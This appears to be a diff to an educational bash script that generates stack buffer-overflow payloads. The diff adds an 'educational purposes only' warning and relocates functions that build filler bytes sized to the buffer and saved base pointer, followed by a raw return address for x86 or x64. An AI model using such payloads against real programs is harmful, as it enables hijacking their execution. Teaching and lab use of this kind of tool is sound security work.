@@ -28,6 +28,8 @@ print_usage() {
 
     echo "[ABOUT ${glbScriptName}]"
     echo "    Use this script to overflow buffers and run unintended code."
+    echo "    WARNING. This script was designed for educational purposes only!"
+    echo "    Using this for any malicious purposes is bad and probably illegal."
 
     echo ""
 
@@ -44,6 +46,35 @@ print_usage() {
     echo "          Example: '${glbScriptName} -s 10 -a 0x40262c'"
     echo "    -t    The target architecture. If not specified, then x86 is used."
     echo "          Example: '${glbScriptName} -t x64 -s 10 -a 0x40262c'"
+
+}
+
+get_payload() {
+
+    local hexAddress="${1}"
+    local bufferSizeInBytes=${2}
+    local basePointerSizeInBytes=$(get_stack_base_pointer_size)
+    local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${basePointerSizeInBytes} ))
+    local rawAddress="$(get_raw_address ${hexAddress})"
+    local payload="$(get_repeated_string ${totalOverwriteSize})${rawAddress}"
+
+    echo "${payload}"
+
+}
+
+get_stack_base_pointer_size() {
+
+    local sizeInBytes=4
+
+    if [ "${glbTargetArch}" = "x86" ]
+    then
+        sizeInBytes=4
+    elif [ "${glbTargetArch}" = "x64" ]
+    then
+        sizeInBytes=8
+    fi
+
+    echo "${sizeInBytes}"
 
 }
 
@@ -100,36 +131,6 @@ get_repeated_string() {
     done
 
     echo "${finalString}"
-
-}
-
-
-get_payload() {
-
-    local hexAddress="${1}"
-    local bufferSizeInBytes=${2}
-    local basePointerSizeInBytes=$(get_stack_base_pointer_size)
-    local totalOverwriteSize=$(( ${bufferSizeInBytes} + ${basePointerSizeInBytes} ))
-    local rawAddress="$(get_raw_address ${hexAddress})"
-    local payload="$(get_repeated_string ${totalOverwriteSize})${rawAddress}"
-
-    echo "${payload}"
-
-}
-
-get_stack_base_pointer_size() {
-
-    local sizeInBytes=4
-
-    if [ "${glbTargetArch}" = "x86" ]
-    then
-        sizeInBytes=4
-    elif [ "${glbTargetArch}" = "x64" ]
-    then
-        sizeInBytes=8
-    fi
-
-    echo "${sizeInBytes}"
 
 }
 
